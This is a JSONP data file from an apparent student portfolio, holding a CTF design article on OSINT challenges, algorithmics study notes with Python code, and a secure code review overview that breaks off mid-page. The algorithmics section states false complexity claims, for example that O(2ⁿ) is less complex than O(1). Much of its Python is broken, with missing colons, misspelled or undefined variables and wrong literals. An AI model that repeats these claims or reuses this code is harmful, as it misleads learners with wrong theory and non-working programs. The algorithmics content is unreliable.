__NUXT_JSONP__("/nl/projects", (function(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N){return {data:[{projects:[{slug:"minor_OSINT",description:p,title:p,duration:"2 days per week",image:q,tech:[{name:p},{name:"CTF"}],category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:{twitter:f}},createdAt:r,dir:i,path:"\u002Fprojects\u002Fminor\u002FOSINT",extension:g,updatedAt:a,bodyPlainText:"\n# OSINT\n\nDuring this semester, we as a group had the project topic OSINT. OSINT belongs to the field of Cyber. OSINT stands for Open Source Intelligence and includes the method of collecting information and intelligence through public sources.\n\nAt Fontys, government trainees and students have to learn what OSINT entails. To keep this subject interesting, a fun and interactive way to demonstrate OSINT must be found. One way to accomplish this is a CTF related to OSINT. CTF stands for \"Capture the flag\" this is a fun and interactive way to accomplish this.  \n\nThis topic gives more insight what OSINT is and what applications it has this seems to me personally very interesting therefore I would like to learn more about this. For the project we had to set up a CTF framework. This framework makes it possible to achieve goals in a fun way with team members. \nThis framework will incorporate all the challenges that our team has developed this semester. I am going to meet this learning goal by creating fun challenges and working out ethics. All challenges can be found in the CTF challenge platform. To create this platform we as a group used the open source framework CTFd. CTFd is a Capture The Flag framework focusing on ease of use and customizability. It comes with everything you need to run a CTF and it's easy to customize with plug-ins and themes. Within this platform I created most of the challenges. These challenges vary from very easy to very difficult. because it seemed to me personally very nice to keep a standard theme I proposed this to the group. They agreed to this. Therefore, we chose the theme alien invasion. This also has the advantage that with this we are always politically correct because we do not use names or have a bias on an organization or person.\n\n# Article \n\n## How to set up a CTF challenge \n\nIn a CTF, the goal is to solve different tasks (challenges) of different categories. Often by solving the challenges you can gain access to a server, where you can then find a certain text, which is called flag. Hence the name 'capture the flag'. You can then upload this flag as proof that you have passed the challenge. This will earn you points for yourself or your team.\n\nBut making a challenge is a profession and there are several elements to consider for a successful platform. Below I highlight a few of these elements these are drawn up on personal experience.  \n\n### Theme \n\nTo be politically correct and not make biased judgments, it is helpful to keep a theme in your challenges. A nice theme could be alien invasion. You can hang a nice story on this with some humor that makes the user feel completely in his element. In doing so, you exclude any racism and other issues that may come to the surface.  \n\n### Fact checking \n\nWhen you develop a ctf challenge it is important to make sure that what you have created actually works and is true. For example, in a challenge for the group project I had made a challenge the question read as follows:\n\n```  \nIt’s 12:44pm. You get an SMS from our red team manager - “Hey dude, we have a situation... Call me fast!”\n\nYou fasten your hoodie and dial the number as you step out of bed and into the city's sleepy lights. – \"Hello there. So, according to a crime-stoppers report, a passerby witnessed an alien attempting to implant awareness into a... Yes, this is going to sound weird... horse. I said something along the lines of 'a giant robot fled quickly' but I can't recall what it was. On his trip to Neuse River middle school, he reported he was only 400 meters beyond the Buffaloe express C. Store station in Raleigh NC. It's off to the side of the road. Find the robot and the house that it was closest to. We can issue an All-Points Bulletin once you've completed that.\"\n```\n\nIn my question I had made up a robot that was on the run in the question it said that the robot was last seen 400 meters away from a store. Only when the challenge was tested by our test team the robot was not found. The reason why was that the robot had already fled 480 meters away and this was not taken into account. Therefore, the question was too unclear and will be tested before it is used in production. \n\n### Gamification \n\nConveying Osint in a way that is both instructive and interactive. With this we bring the concept of gamification to the foreground. \n\nSimply put, **gamification is the incorporation of game design elements into product** in this case we are gameifying OSINT with a ctf platform. \n\nAddictive games keep users engaged by getting them to complete tasks that resonate with their goals and intrinsic motivations. Gamification applies this same strategy to non-game products by figuring out the things that trigger users to take action and rewarding them with features like point systems, badges, or even just simple progress indicators. The result is a product that motivates users and keeps them coming back for more and combined with an education element it is for most people the best way to learn. Gamification can be a powerful strategy, but there's a delicate balance between engagement and frustration. Instead of focusing on their users' needs, some teams get caught up in the novelty of gaming, losing sight of the true purpose of their product. The result is an experience that has all the obvious game elements like a simple point counter, badges, and leaderboards, but overlooks the [game mechanics](https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FGame_mechanics)—the core of successful gamification—making the experience feel trivial and gimmicky.\n\nGamification is becoming a ubiquitous part of product design. Done correctly, it can be an effective way to keep your users engaged and make accomplishing *necessary tasks* more enjoyable. When done poorly, gamification can be distracting and gimmicky. \n\n### Flag syntax \n\nWhat certainly must be taken into account is the syntax of your flag, you must think of the date and what format it should take for example day-month-year. It sounds very simple but even this is not sufficient so it is best to write both so \"16-12-2021\" = \"day-month-year\". Another example is the notation of coordinates here with you clearly indicate which notation is valid and how much you may round off on the comma for example. \n\n### Conclusion \n\nThere are a lot of elements to consider when developing a ctf challenge, both in terms of motivation for the user, but also in terms of the correct design of your questions and the syntax. But with these things in mind, it is definitely possible to develop a nice flatform with complex challenges.\n\n\n\n\n\n\n\n",readingTime:n},{slug:"minor_algorithmics",description:"What are algorithmics",id:j,title:"Algorithmics",duration:"2 weken",image:"\u002Fimages\u002Fprojects\u002Fminor\u002Falgorithm\u002Falgorithm.jpg",tech:[{name:s},{name:"algorithmics"}],category:[{name:b},{name:c}],author:{name:d,image:e,social:{twitter:f}},createdAt:"2021-11-07T00:00:00.000Z",dir:i,path:"\u002Fprojects\u002Fminor\u002Falgorithmics",extension:g,updatedAt:a,bodyPlainText:"\n\n\n[Udacity - Computer science](https:\u002F\u002Fclassroom.udacity.com\u002Fcourses\u002Fcs313)\n\nArticle before I knew we had to write about the group project :).\n\n# The basics for algorithms \n\nThe simple truth is that algorithms are just ways to do things. They’re processes to solve a type of problem. These problems can be complex however, just because there are difficult algorithms doesn’t mean that all algorithms are that complex.\n\nYou can begin thinking algorithmically by breaking the problem down and building the solution up, or by breaking the problem down and building the solution up. As developers, we have a natural urge to start with the solution. However, I would recommend breaking down the problem first and then creating the solution from there.\n\nThinking in small steps to solve a problem takes time. But it will however help us better understand the problem. The better an algorithm is, the shorter the time is to determine that an algorithm is faster, scientists have developed the big o notation later on we go into further detail. \n\nSo, how do you even begin to think about these problems to solve in the first place. To solve a problem you always need data. This data we call a dataset this data gives us the possibility to do an analysis. Can I solve my problem with the data as it is now or should I first prepare this data so that it meets my needs. If you have answers to these questions we can start solving our problem. To begin with, it is useful to grab a small sample of your original dataset. With this sample we are going to work out our algorithm \n\nUsing that principle for our algorithm, if we can get it to operate correctly with one item entry and then with ten, we can probably get it to work with any number of items. You'll eventually test it with a lot more to confirm. This gradual build-up aids you in comprehending the nuances and identifying the problem's subtle traps. During this process you really get to know the data. \n\nThe running time of an algorithm can very with...\n\n- The size of the input\n- The content structure of the input\n- The type of computer we're using \n- The amount of memory the computer has \n- How the algorithm is implemented \n- The programming language used \n\n## Data structures \n\nA data storage format. It is the collection of values and the format they are stored in, the relationships between the values in the collections as well as the operations applied on the data stored in the structure. These stored data collections are called arrays. These arrays can very per language examples of this are The language Java with homogeneous containers type are type bound. In python we have heterogeneous structures they are not type bound.\n\nIt often occurs that during an algorithm it is necessary to sort or search for data. For these functions several already existing algorithms \u002F data structures have been developed. Some very well-known algorithms are:\n\n Searching:\n\n- Linear search\n- Binary search\n\nSorting:\n\n- Insertion sort\n- Selection sort\n- Bubble sort\n- Heapsort \n- Merge sort \n- Quick sort\n- Radix Sort\n\nData structures elements: \n\n- Array n dimensional & Strings\n- Boolean\n- Trees \n- Tuple & Sets \n- Hashmap and hashtable\n- Linked List \n- Stack and Queues \n\nThankfully, you’ll probably never have to actually implement any of these algorithms as a professional developer. These days, the most efficient search and sort algorithms are provided in standard libraries that come with most languages. But still it is important for you to know how to use one and what the advantages and disadvantages are. \n\n## What makes a good algorithm\n\n### Correctness\n\nSometimes a algothim does not give you a correct answer or the best answer because the only perfect algorithms that we know for those problems take a really, really long time. Fore example lets say we want a programm that would determine the most effiecient oute for a truck that delivers packages. staring and ending the day at a depot. It would take weeks to run to going through all the possibilites. But if we're okay with a program that would determine a route that goed but maybe not the best. Then i could run in seconds in some cases, good is good enough.\n\n### Efficiency \t\n\nAsymptotic analysis allows algorithms to be compared independently of a particular pogramming laungauage or handware. \n\n## Asymptotic notation\n\nLet's think about the running time of an algorithm more carefully. We use a combination of two ideas. First, we determine how long the algorithm takes, in terms of the size of its input. So we think about the running time of the algorithm as a function of the size of its input. The second idea is that we focus on how fast this function grows with the input size. We call that the rate of growth of the running time. To keep things manageable, we simplify the function to distill the most important part and cast aside the less important parts.\n\nWe'll see three forms of it: **big-Θ** notation, **big-O** notation, and **big-Ω** notation.\n\n### Big-Θ notation\n\nWhen we use **big-Θ** notation, we're saying that we have an asymptotically tight bound on the running time. \"Asymptotically\" because it matters for only large values of **n**. \"Tight bound\" because we've nailed the running time to within a constant factor above and below.\n\n### Big O notation\n\nBig-O notation is used by programmers to compare and measure the performance of algorithms. Big O notation is one of the most fundamental tools for computer scientists to analyze the cost of an algorithm. It is a good practice for software engineers to understand in-depth as well. The big O notation gives a strong statement about the worst-case running time. We use big-Θ notation to asymptotically bound the growth of a running time to within constant factors above and below. Sometimes we want to bound from only above. Because big-O notation gives only an asymptotic upper bound, and not an asymptotically tight bound, we can make statements that at first blush seem incorrect, but are technically correct.\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Falgorithm\u002Fbig_o_notation.jpeg\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Falgorithm\u002Fbig_o_notation.jpeg\" alt=\"Big O noation\"\u002F\u003E\n\u003C\u002Fa\u003E\n\n#### O(1) has the least complexity\n\nIf you can build an algorithm that solves the problem in O(1) notation, you are likely at your best possible solution. When the complexity of a scenario exceeds O(1), we can examine it by looking for its O(1\u002Fg(n)) equivalent. For instance, O(1\u002Fn) is more difficult than O(1\u002Fn2).\n\n#### O(log(n)) is more complex than O(1), but less complex than polynomials\n\nBecause sorting algorithms are frequently associated with divide and conquer algorithms, O(log(n)) is a desirable complexity to aim for. Because the square root function can be regarded a polynomial with an exponent of 0.5, O(log(n)) is less difficult than O(n).\n\n#### O(nˣ) Complexity of polynomials increases as the exponent increases\n\nFor example, O(n⁵) is more complex than O(n⁴). Due to the simplicity of it.\n\n#### O(2ⁿ) Exponentials have greater complexity than polynomials as long as the coefficients are positive multiples of n\n\nO(2ⁿ) is more complex than O(n⁹⁹), but O(2ⁿ) is actually less complex than O(1). We generally take 2 as base for exponentials and logarithms because things tends to be binary in Computer Science, but exponents can be changed by changing the coefficients. If not specified, the base for logarithms is assumed to be 2.\n\nyou can write a book about big o notation so much and so big is the subject but for more information I would just google the topic.  \n\n### Big-Ω (Big-Omega) notation\n\nWe might wish to declare that an algorithm takes at least a specific amount of time without specifying a maximum time. The Greek letter \"omega\" is used in big-Ω notation. We use big-Ω notation for **asymptotic lower bounds**, since it bounds the growth of the running time from below for large enough input sizes.\n\n# Lets begin\n\n## Basics\n\n### Arrays:\n\nPython = list = non type bound\n\nJava = array = type bound\n\n### Executions\n\nOperations on Data structures\n\n- Access and read values \n- Search for an arbitrary values \n- Insert values at any point into the structure \n- Delete values in the structure \n\nWe access the data in the array by using the index of the stored positions of the value. Every value in the array has its index with which you can locate it also called an address. The base index in most languages is 0 to n; space = n * m.  \n\n```python\nnew_list = [1, 2, 3]\nresult = new_list[0]\t# 1\nresult = new_list[10] \t# IndexError: list index out of range \n```\n\nYou cannot access an address index that is larger than your instantiated array size. This will always result in an index out of bound error.   \n\nLets now search for a value in our list with Linear search:\n\n```python\nif 1 in new_list : print(True)\n    \nfor n in new_list:\n    if n == 1:\n        print(True)\n        break\n```\n\nLets insert a new value in the array: there are two methods to do so one on linear runtime and on constant time Append. They're different in that insert linear will insert in every given index and append will add to the array. But it also depends on the language we use. \n\n```python\nnumbers = [] # Default 1 element can be inserted \nlen(numbers) # Will give 0 as answer \nnumbers.append(2)\nnumbers.append(200) # Will execute resize array \n\n```\n\nThe append function will only increase the when the index will hit size 0, 4, 8, 16, 25, 35, 46... and so on we call this amortized constant space complexity. \n\n```python\n# Big-O of K | K = Number of items we append\nnumbers = []\nnumbers.extend([4, 5, 6]) # Makes a serie of append calls\n```\n\n## Linked list \n\nEach data structure solves a particular problem. Arrays are particularly good at accessing\u002Freading values that will happen in constant time. But arrays are pretty bad at inserting and deleting which both run at linear time. Linked lists on the other hand are somewhat better at this although it has some problems. They are trying to solve a problem that involves far more inserts and deletes than accessing. A linked list can be a better tool than an array.\n\nA linked list is a linear data structure where each element in the list is contained in a separate object called a node. A node models two pieces of information an individual item of the data we want to store and a reference to the next node in the list. The first node in the linked list is called the head of the list. While the last node is called the tail. The head and the tail nodes are special the list only maintains a reference to the head although in some implementations it keeps a reference to the tail as well. Every node other than the tail point to the next node in the list. But the tail doesn't point to anything this is how we know it's the end of the list. Nodes are what called self-referential objects. Linked lists usually come in two forms a singly linked list where each node stores a reference to the next node in the list or a doubly linked list where each node stores a reference to both the node before and after\n\n```python\nclass Node: \n    # An object for storing a single node of a linked list\n    # Models tow attributes - data and the link to the next node in the \t\tlist\n    \n    data = None # To hold on to the data we are storing\n    next_node = None # To point to the next node in the list\n    \n    def __init__(self, data):\n        self.data = data\n        \n    def __repr__(self):\n        return \"\u003CNode data: %s\u003E\" % self.data # ToString value\n    \nclass LinkedList:\n\t# Singly linked list\n  \n    def __init__(self):\n        self.head = None\n    \n    def is_empy(self):\n        return self.head == None\n    \n    def size(self):\n        # Return the number of nodes in the list \n        # Takes 0(n) \u002F linear time\n        \n        current = self.head\n        count = 0\n        \n        while current:\n            count += 1\n            current = current.next_node\n        \n        return count\n\n  \tdef add(self, data):\n        # Adds new Node container data at head of the list\n        # Takes 0(1) time\n        \n        new_node = Node(data)\n        new_node.next_node = self.head\n        self.head = new_node\n        \n    def search(self, key):\n        # Search for the first node containing data that maches the key\n        # Return the node or 'None' if not found\n        # Takes 0(n) time\n        \n        current = self.head\n        \n        while current:\n            if current.data == key:\n                return current \n            else:\n                current = current.next_node\n                \n        return None\n    \n    def insert(self, data, index):\n        # Inserts a new Node containing data at index position \n        # Insertion takes 0(1) time but infing the node at the insertion point take 0(n time)\n        # Takes overal 0(n) time\n        \n        if index == 0 :\n            self.add(data)\n        \n        if index \u003E 0:\n            new = Node(data)\n            \n            position = index \n            current = self.head\n            \n            while position \u003E 1:\n                current = node.next_node\n                position -= 1 \n                \n            prev_node = current \n            next_node = current.next_node \n            \n            prev_node.next_node = new \n            new.next_node = next_node\n    \n    def remove(self, key):\n        # Removes Node containing data that matches the key\n        # Return the node of None if key doesn't exists\n        # Takes 0(n) time\n        \n        current = self.head\n        previous = None;\n        found = False\n        \n        while current and not found:\n            if current.data == key and current == self.head:\n                found = True\n                self.head = current.next_node\n            elif current.data == key:\n                found = True \n                previous.next_node = current.next_node\n            else:\n                previous = current\n                current = current.next_node\n                \n        return current     \n        \n    def node_at_index(self, index):\n        if index == 0:\n            return self.head\n        else:\n            current = self.head\n            position = 0\n        \n        while position \u003C index:\n            current = current.next_node\n            possition += 1 \n        \n        return current\n        \n    def __repr__(self):\n        # Return a string representation of the list\n        # Takes 0(n) time\n        \n        nodes = []\n        current = self.head\n        \n        while current:\n            if current is self.head:\n                nodes.append(\"[Head: %s]\" % current.data)\n            elif current.next_node is None:\n                nodes.append(\"[Tail: %s]\" % current.data)\n            else:\n                nodes.append(\"[%s]\" % current.data)\n            \n            current = current.next_node\n       \treturn '-\u003E '.join(nodes)\n\t\t \n        \n        \n# [Head],[],[],[],[Tail]\nl = LinkedList()\nl.add(1)\nl.size() # returns 1 \nl.add(2)\nl.add(3)\nl.size() # returns 3\n\nl # returns [Head: 3]-\u003E [2]-\u003E [Tail: 1]\n        \n```\n\nHead can be seen as the top of an book pile its the first book you pick from the pile. Unlike arrays where when you insert an element into the array all element after the particular index need to be shifted. With a linked list we just need to change the references to next on a few nodes. This way we can insert a node at any point in the list in constant time.\n\n## Merge sort\n\nMerge sort works like binary sort by splitting up the problem into sub problems. But it takes it one step further. In the first sequence we split the array into two smaller arrays on the second sequence we are going to split the first sequence again and so on until we are down to single element arrays. After that the merge sort algorithm works backwards. By repeatedly merging the single element arrays and sorting them at the same time.\n\nSolving a problem like this by recursively breaking down the problem into subparts until it is easily solvable is an algorithmic strategy called divide and conquer. \n\n```python\ndef merge_sort(list):\n    # Sorts a list in ascending order \n    # Return a new sorted list \n    \n    # Devide: Find the midpoint of the list and divide into sublists\n    # Conquer: Recursively sort the sublist created in previous step\n    # Combine: Merge the sorted sublists created in previous step \n    \n    # Takes O(kn log n) time\n    \n    if len(list) \u003C= 1:\n        return list \n    \n    left_half, right_half = split(list)\n    \n    left = merge_sort(left_half)\n    right = merge_sort(right_half)\n    \n    return merge(left, right)\n\ndef split(list):\n    # Divide the unsorted list at midpoint into sublists\n    # Returns two sublists - left and right\n    \n    # Takes overal O(k log n) time\n    \n    min = len(list)\u002F\u002F2\n    left = list[:mid] # list[0:mid]            Takes n of k \n    right = list[mid:] # list[mid:len(list)]\n    \n    return left, right\n\ndef merge(left, right):\n    # Merges two lists (arrays), sorting them in the process\n    # Return a new merged list\n    \n    # Runs in overal O(n) time\n    \n    l = []\n    i = 0\n    j = 0\n    \n    while i \u003C len(left) and j \u003C len(right):\n        if left[i] \u003C right[j]:\n            l.append(left[i])\n            i += 1\n        elif left[i] \u003E= right[j]:\n            l.append(right[j])\n            j += 1\n   \n    while i \u003C len(left):\n        l.append(left[i])\n        i += 1 \n        \n    while j \u003C len(right):\n        l.append(right[j])\n        j += 1\n     \n    return l\n\ndef verify_sorted(list):\n    n = len(list)\n    \n    # Stopping condition \n    if n == 0 or n == 1: \n        return true\n    \n    return list[0] \u003C list[1] and verify_sorted(list[1:])\n \t# [1, 2, 3, 4, 5]\n    # [2, 3, 4, 5]\n    # [3, 4, 5]\n    # [4, 5]\n    # [5]\n\n        \nalist = [54, 62, 93, 17, 77, 31, 44, 55, 20]\nl = merge_sort(alist)\nprint(l) # Return [17, 20, 31, 44, 54, 62, 77, 93]\nprint(verify_sorted(alist)) # Return False\nprint(verify_sorted(l)) # Return True\n```\n\n### Linked list merge sort\n\n```python\nfrom linked_list import LinkedList\n\ndef merge_sort(linked_list):\n    # Sorts a linked list in ascending order\n    # - Recursively divide the linked list into sublists containing a single node\n    # - Repeatedly merge the sublists to produce sorted sublists until on remains \n    # Returns a sorted linked list\n    \n    if linked_list.size() == 1:\n        return linked_list\n    elif linked_list.head is None:\n        return linked_list\n    \n    left_half, right_half = split(linked_list)\n    left = merge_sort(left_half)\n    right = merge_sort(right_half)\n    \n    return merge(left, right)\n\ndef split(linked_list):\n    # Divide the unsorted list at midpoint into sub linked lists\n    \n    if linked_list == None or linked_list == None:\n        left_half = linked_list\n        right_half == None \n        \n        return left_half, right_half\n    \n    else:\n        size = linked_list.size()\n        mid = size\u002F\u002F2 \n    \n    \tmid_node = linked_list.node_at_index(mid - 1)\n        \n        left_half = linked_list \n        right_half = LinkedList()\n        right_half.head = mid_node.next_node\n        mid_node.next_node = None\n        \n        return left_half, right_half\n  \ndef merge(left, right):\n    # Merges two linked lists, sorting by data in the nodes\n    # Return a new, merged list\n    \n    # Create a new linked list that contains nodes from \n    # Merging left and right\n    merged = LinkedList()\n    \n    # Add a fake head that is discarded later \n    merged.add(0)\n    \n    # Set current to the head of the linked list\n    current = merged.head\n    \n    # Obtain head nodes for left and right linked lists\n    left_head = left.head\n    right_head = right.head\n    \n    # Iterate over left and right unril we reach the tail node of either\n    while left_head or right_head\n    \t# If the head node of left is None, we are past the tail\n        # Add the node from right to merged linked list\n        \n        if left_head is None:\n            current.next_node = right_head\n            # Call next on right to set loop condition to False \n            right_head = right_head.next_node\n        \n        # If the head node of tight is None, we are past the tail\n        # Add the tail node from left to merged linked list\n        elif right_head is None\n        \tcurrent.next_node = left_head\n            # Call next on left to set loop condition to False\n            left_head = left_head.next_node\n            \n        else:\n            # Not at either tail node \n            # Obtain node data to perform comparison operations\n            left_data = left_head.data\n            right_data = right_head.data\n            # If data on left is less than right, set current to left node\n            if left_data \u003C right_data:\n                current.next_node = left_head\n                # Move left head to next node \n                left_head = left_head.next_node\n            # If data on left is greater than right, set current to right node\n            else:\n                current.next_node = right_head\n                # Move right head to next node\n                right_head = right_head.next_node \n         \n        # Move current to next node\n        current = current.next_node\n     \n    # Discard fake head and set first merged node as head\n    head = merged.head.next_node\n    merged.head = head\n    \n    return merged \n   \nl = LinkedList()\nl.add(10)\nl.add(2)\nl.add(44)\nl.add(15)\nl.add(200)\n\nprint(l)\nsorted_linked_list = merged_sort(l)\nprint(sorted_linked_list)\n#[Head: 200]-\u003E [15]-\u003E [44]-\u003E [2]-\u003E [Tail: 10]\n#[Head: 2]-\u003E [10]-\u003E [15]-\u003E [44]-\u003E [Tail: 200]\n\n# split -\u003E size \n# midpoint = 2 \n#[Head: 200]-\u003E [15]-----\u003E [44]-\u003E [2]-\u003E [Tail: 10]\n#Left : [Head: 200]-\u003E [15] \n#SubLeft : [Head: 200]\n#SubRight : [Head: 15]\n#Current: [Head: 15]-\u003E [200]\n\n\n#Right: [Head: 44]-\u003E [2]-\u003E [Tail: 10]\n```\n\nThese are the data structures I began with, these are the fundamentals for algorithmic. \n\n## Recursion \n\nThe ability of a function to call itself. Recursive functions are difficult to understand. The flow of control is quite complex.\n\n```python\n# Normal\ndef sum(numbers):\n    total = 0\n    for number in numbers:\n        total += number\n    return total\n\nprint(sum([1, 2, 7, 9]))\n```\n\n```python\n# Recursion\ndef sum(numbers):\n    if not numbers: \n        return 0 \n    print(\"Calling sum(%s)\" % numbers[1:])\n \tremaining_sum = sum(numbers[1:])\n    print(\"Call to sum(%s) returning %d + %d\" % (numbers, numbers[0], remaining_sum))\n    return numbers[0] + remaining_sum\n\nprint(sum([1, 2, 7, 9]))\n# Calling sum([2, 7, 9])\n# Calling sum([7, 9])\n# Calling sum([9])\n# Calling sum([])\n# Call sum([9]) returning 9 + 0\n# Call sum([7, 9]) returning 7 + 9\n# Call sum([2, 7, 9]) returning 2 + 16\n# Call sum([1, 2, 7, 9]) returning 1 + 18\n# Result: 19\n```\n\n## Quick Sort\n\nQuickSort is a Divide and Conquer algorithm. It picks an element as pivot and partitions the given array around the picked pivot. There are many different versions of quickSort that pick pivot in different ways. \n\nList: [4, 6, 3, 2, 9, 7, 3, 5]\n\n​\tPivot: [4]\n\n​\tLess than pivot: [3, 2, 3]  -\u003E  [2, 3] [3] [ ]  -\u003E  [ ] [2] [3] = [2, 3]  -\u003E  [2, 3] [3] [ ]  -\u003E  [2, 3, 3]\n\n​\tGreater than pivot: [6, 9, 7, 5] -\u003E [5] [6] [9, 7]  -\u003E  [5, 6, 7, 9]\n\n  [2, 3, 3, 4, 5, 6, 7, 9]\n\n```python\nimport sys\nfrom load import load_numbers\n\nnumbers = load_numbers(sys.argv[1])\n\ndef quicksort(values):\n    if len(values) \u003C= 1:\n        return values \n    less_than_pivot = []\n    greater_than_pivot = []\n    pivot = value[0]\n    \n    for value in values[1:]:\n        if value \u003C= pivot:\n            less_than_pivot.append(value)\n        else :\n            greater_than_pivot.append(value)\n    \n    print(\"%15s %1s %-15s\" % (less_than_pivot, pivot, greater_than_pivot))\n    return quicksort(less_than_pivot) + [pivot] + quicksort(greater_than_pivot)\n\nprint(numbers) \n# [4, 6, 3, 2, 9, 7, 3, 5]\nsorted_number = quicksort(numbers)\n# [3, 2, 3] 4 [6, 9, 7, 5]\n# \t [2, 3] 3 []\n#        [] 2 [3]\n#       [5] 6 [9, 7]\n#       [7] 9 []\nprint(sorted_numbers) \n# [2, 3, 3, 4, 5, 6, 7, 9]\n```\n\n## Selection sort\n\nAlso a bad sorting sorting algorithm. With each loop we will look through each of the values in the unsorted array and find the smallest value and move that value to the end of the sorted array. We start with the first value in the unsorted and say its the minimum or smallest value we have seen so far for now. Than we will look at the next value and see if that one is smaller than the current smallest value if so we mark is as the new minimum. We continue that way until we reach the end of the list. We know that the value that we have marked is the smallest value in the array. Than we move that value from the current list to a new list called sorted and we delete it from the current list. We do this until there are no more items in the unsorted array. \n\n```python\nimport sys\nfrom load import load_numbers\n\nnumbers = load_numbers(sys.argv[1])\n\ndef selection_sort(values):\n    sorted_list = []\n    print(\"%-25s %-25s\" % (values, sorted_list))\n    for i in range(0, len(values)):\n        index_to_move = index_of_min(values)\n        sorted_list.append(values.pop(index_to_move))\n        print(\"%-25s %-25s\" % (values, sorted_list))\n    return sorted_list \n\ndef index_of_min(values):\n    min_index = 0\n    for i in range(1, len(values)):\n        if values[i] \u003C values[min_index]:\n            min_index = i\n    return min_index\n\nprint(selection_sort(numbers))\n```\n\n## Bogo Sort \n\nBad sorting randomly switching numbers till its sorted. Stumbling on a solution is literally a matter of luck and for lists with more than a few items it might never happen.\n\n```python\nimport random\nimport sys\nfrom load import load_number \n\nnumber = load_numbers(sys.argv[1])\n\ndef is_sorted(values):\n    for index in range(len(values) - 1)\n     \tif values[index] \u003E values[index + 1]:\n            return False\n    return True\n\ndef bogo_sort(values):\n    attempts = 0\n    while not is_sorted(values):\n        print(attempts)\n        random.shuffle(values)\n        attempts += 1\n    return values \n\nprint(bogo_sort(numbers))\n\n```\n\n",readingTime:"20 min read"},{slug:"minor_code-review",description:"COurse code review with a cyber aspact",id:j,title:"Course code cyber analysis",duration:k,image:"\u002Fimages\u002Fprojects\u002Fminor\u002Fcode-analysis.png",tech:[{name:"review"}],category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:{twitter:f}},createdAt:"2021-11-14T00:00:00.000Z",dir:i,path:"\u002Fprojects\u002Fminor\u002Fcode-review",extension:g,updatedAt:a,bodyPlainText:"# Course code cyber analysis  (Secure code review)\n\nA Course code cyber analysis also know as a secure code review is a specialized process that involves manually and\u002For automatically reviewing an application's source code in order to find security-related problems. A secure code review does not strive to find every flaw in the code; rather, it seeks to provide insight into the sorts of vulnerabilities that exist and to assist the application's developers in understanding what issues are present. The purpose is to provide developers with information that will aid them in making the source code of the application more sound and safe.\n\nA secure code review concentrates on seven different security techniques or regions. An application that is vulnerable in any way makes it a target for a hostile user and raises the chances of it being used in an attack. A secure code review should educate developers about the source code's soundness in each of the following areas:\n\n- Authentication\n- Authorization\n- Session management\n- Data validation\n- Error handling\n- Logging\n- Encryption\n\n## Manual vs. Automated Review\n\nA secure code review can be either manual or automated, each with its own set of benefits and drawbacks. An analyst performs a manual review by going through the code line by line, looking for errors and security issues. A tool is used to scan the code and flag potential issues in an automated review.\n\nManual review takes time and requires significant domain expertise to complete correctly. Manual code review can often take years of practice to become efficient. Errors in the review (missed and incorrect findings) are unavoidable even with experienced human analysis. According to the MITRE Secure Code Review Practice, a skilled reviewer can complete approximately 3,000 lines of code per day.\n\nAutomated review aids in the resolution of issues associated with manual review. Good automated review tools, on the other hand, are not cheap. Furthermore, the technology underlying automated tools is only effective at detecting certain types of flaws. A single automated tool may be effective at detecting some issues but ineffective at detecting others. Using multiple automated tools can help to mitigate this issue, but it will still not uncover every issue. Automated tools also have a tendency to generate false positives (reported findings that are not actually issues). Adjudicating false positives necessitates human intervention and depletes the development team's time.\n\nPrevention is better than to cure, and this also applies to software development, which is why it is critical to look for vulnerabilities early in the development process. There are already several plugins in Ide that scan your code on a regular basis. This reduces the client's vulnerability to vulnerabilities. But again, your software and you may overlook something. \n\n### Manual\n\n#### Over-the-Shoulder Code Reviews\n\nOver-the-shoulder code reviews take place at the developer's workstation, where an experienced team member walks through the new code and offers ideas in the form of a dialogue. It is the simplest method for conducting code reviews and does not necessitate a pre-defined structure.\n\nIn addition to any official code review procedure that may be in place, such a code review may still be done informally today. Over-the-shoulder code reviews have typically been done in person, but distant teams can use collaborative tools to do so as well.\n\n#### Pair Programming\n\nPair programming is a process of continuous code review. Two developers are seated at a workstation, but only one is actively coding, while the other provides real-time feedback.\n\nWhile it may be a useful tool for inspecting new code and training developers, its time-consuming nature may make it inefficient. During the review period, the reviewer is prevented from doing any other productive work.\n\n#### Digital\n\nIf you use [GitHub](https:\u002F\u002Fgithub.com\u002Ffeatures\u002Fcode-review\u002F) to maintain your Git repositories on the cloud, you may have already used forks and pull requests to review code. In its pull requests, GitHub includes a code review tool. The code review tool is included in GitHub's core service.\n\nA reviewer who has access to the code repository on GitHub can assign themselves to the pull request and complete a review. A developer who has submitted a pull request may also request that an administrator review it.\n\n### Automation\n\nAutomated code review tools have been around for a while as static analysis and unit testing frameworks. However, because business needs necessitate speed and agility, code review must be automated. It can result in faster feedback, higher code quality, and shorter time to production.\n\nCan automated code reviews replace manual code reviews?\n\nNo. Manual code reviews reduce risky high level decisions such as the use of suboptimal architectures. They also support a collaborative culture and peer feedback.\n\nWhile automated code reviews are better than having no code reviews, they are not a replacement for manual code reviews. However, they can make manual code reviews more efficient since they save human reviewers from looking for minor errors such as function naming, spacing or style.\n\n#### SonarQube\n\nSonarQube (previously Sonar) is a free and open source platform for managing code quality. It is primarily a tool for developers to use in order to produce high-quality code. From a general overview of the code quality, you can navigate to the specific line(s) of code that are causing the issue. SonarQube is open source and extensible via plugins. Many programming languages are supported by the application, including Java, JavaScript, C#, C++, COBOL, PHP, and others. These languages can be examined for quality issues such as code duplication, test failures, and a variety of other issues. I'll go over some of the new and unknown features in this article.\n\n##### Implementation\n\nIn my sixth semester, I also used sonarqube to ensure my code quality. As described above, prevention is better than to cure so I have installed the sonarqube plugin inside my IDE which checks every time I save my file to see if there are things that need to be adjusted. I also implemented sonarqube within my CI\u002FCD module which when I made a commit to my repository automatically tested my code. If it then failed, my code was not uploaded within my github repo. \n\nI chose this solution because automated solutions can be quite expensive and the costs can add up quickly. The SonarQube solution is open source so it is free to use and is well maintained by the community. The analyses performed on my code are divided into several domains so is the cyber domain also one of them. \n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fcode-review\u002Fcode-quality_qonarcloud.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" 